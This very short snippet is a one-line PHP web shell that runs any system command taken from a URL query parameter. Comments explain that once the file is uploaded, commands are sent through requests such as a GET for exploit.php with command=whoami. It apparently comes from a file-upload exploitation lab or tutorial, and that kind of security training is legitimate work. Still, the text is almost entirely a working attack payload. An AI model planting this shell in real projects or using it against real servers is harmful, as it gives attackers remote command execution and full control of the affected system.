// pass an arbitrary system command via a query parameter

<?php echo system($_GET['command']); ?>

// Once uploaded, use this to pass commands: GET /example/exploit.php?command=whoami HTTP/1.1

